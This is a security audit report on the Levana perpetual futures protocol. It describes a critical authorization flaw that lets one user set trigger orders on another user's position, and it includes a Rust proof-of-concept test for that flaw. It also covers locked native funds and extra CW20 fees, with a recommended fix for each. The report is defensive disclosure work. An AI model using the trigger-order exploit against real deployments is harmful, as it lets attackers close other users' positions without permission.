# Overview

Levana is a cosmos based perpetuals futures protocol.

# Findings

---

## [C-1] Attackers can modify the position of other users via the trigger order flow

## Description

When setting a trigger order, users specify which posiion ID they want to modify. There are no checks that the position to modify belong to that user.

## Proof of issue

```rust
#[test]
fn poc_set_other_users_trigger_order_high() {
    // Setup
​
    let market = PerpsMarket::new(PerpsApp::new_cell().unwrap()).unwrap();
​
    let trader = market.clone_trader(0).unwrap();
​
    let cranker = market.clone_trader(1).unwrap();
​
    // Trader that will execute attack on other trader's positions
    let attacker = market.clone_trader(3).unwrap();
​
    let take_profit_override = PriceBaseInQuote::try_from_number(105u128.into()).unwrap();
​
    let trigger_and_assert = |pos_id: PositionId| {
        market.exec_set_price("105".try_into().unwrap()).unwrap();
        market.exec_crank(&cranker).unwrap();
​
        let pos = market.query_closed_position(&trader, pos_id).unwrap();
        assert_position_take_profit(&pos).unwrap();
    };
​
    // Set price of the market to be 1--
    market.exec_set_price("100".try_into().unwrap()).unwrap();
    let (pos_id, _) = market
        .exec_open_position(
            &trader,
            "100",
            "10",
            DirectionToBase::Long,
            "1.0",
            None,
            None,
            None,
        )
        .unwrap();
    // @audit - Supplied the sender to be the attacker address. The attacker was able to execute a set trigger order for another user.
    market
        .exec_set_trigger_order(&attacker, pos_id, None, Some(take_profit_override))
        .unwrap();
    // Market price increases and initates trigger set by the attacker when take_profit gains are met
    trigger_and_assert(pos_id);
}
​
```

## Severity an impact

This is a critical vulnerability because users can trigger when other users' positions close. An attacker would essentially be able to close and modify ANY other user's position without their permission.

## Recommendation

The recommendation is to include authority checks when setting trigger orders. Only the owner of a position should be allowed to set their own trigger orders.

---

## [L-1] Users funds can be locked when performing operations that accept native tokens

## Description

Additional funds sent to any operation that uses `get_native_funds_amount`, will be lost and locked into the market contract. This is because funds are sent as an array and only the first item in that array that is a native token is used for the operation.

## Proof of Issue

```rust
pub(crate) fn get_native_funds_amount(
        &self,
        store: &mut dyn Storage,
        info: &MessageInfo,
    ) -> Result<NonZero<Collateral>> {
        let amount = match self.get_token(store)? {
            Token::Native {
                denom,
                decimal_places,
            } => {
                let coin = info
                    .funds
                    .iter()
                    .find(|coin| coin.denom == *denom)
                    .ok_or_else(|| {
                        perp_anyhow!(
                            ErrorId::NativeFunds,
                            ErrorDomain::Market,
                            "no coins attached!"
                        )
                    })?; //@audit - get_native_funds doesn't account for a funds vector greater than 1
```

## Severity and Impact Summary

Users that send any additional funds in the funds array will lose those tokens.

## Recommendation

The recommendation is to use the cosmwasm utils for receiving payments. In the code snippet below, the cosmwasm team implements checks for funds array containing multiple items. Alternatively, the team can error out anytime a users sends anything with a funds length greater than 1.

```rust
/// If exactly one coin was sent, returns it regardless of denom.
/// Returns error if 0 or 2+ coins were sent
pub fn one_coin(info: &MessageInfo) -> Result<Coin, PaymentError> {
    match info.funds.len() {
        0 => Err(PaymentError::NoFunds {}),
        1 => {
            let coin = &info.funds[0];
            if coin.amount.is_zero() {
                Err(PaymentError::NoFunds {})
            } else {
                Ok(coin.clone())
            }
        }
        _ => Err(PaymentError::MultipleDenoms {}),
    }
}

```

---

## Title: [L-1] Users incur additional fees when calling removal updates in the CW20 handler

## Description

RExecuteMsgs that don't require sent funds occur in two sections of the market contract code. one of the places theses occur in take place within the CW20 handler. This CW20 handler requires a minumm fee to be payed when executing a removal branch. Essentially a user would pay extra fees if they were to execute these messages that are nested in the CW20 handler.

## Proof of Issue

```rust

 ExecuteMsg::Receive {
            amount,
            msg,
            sender,
        } => {
            ...
              Token::Cw20 {
                    addr,
                    decimal_places, // @audit-info info.sender is the cw20 token contract in this case.As long
                } => {
                  ...
                    NonZero::new(Collateral::from_decimal256(Decimal256::from_atomics(
                        amount.u128(),
                        (*decimal_places).into(),
                    )?))
                    .context("Cannot send 0 tokens into the contract")?
                }

                ExecuteMsg::UpdatePositionRemoveCollateralImpactLeverage {...}

                ExecuteMsg::UpdatePositionRemoveCollateralImpactSize {...}

                ExecuteMsg::UpdatePositionLeverage {...}

                ExecuteMsg::UpdatePositionMaxGains {...}

                ExecuteMsg::PlaceLimitOrder {...}
            };

```

## Severity and Impact Summary

The impact is low because the fee required is only `amount > 0`. There is also an alterante path for user to execute their actions without having to pay the additional fees.

## Recommendation

The recommended action is to encourage users to not use the nested CW20 position update handlers and to use the alternate path. Furthermore, it would be beneficial to remove or force users to use the path that doesn't require the extra fees.

---

## [Link to Public Report](https://docsend.com/view/md5zh8fwxmaxejja)

## [Audit release details](https://blog.levana.finance/levana-perps-passes-security-audit-by-fyeo-a-comprehensive-summary-of-the-audit-report-fec50fa73c18)
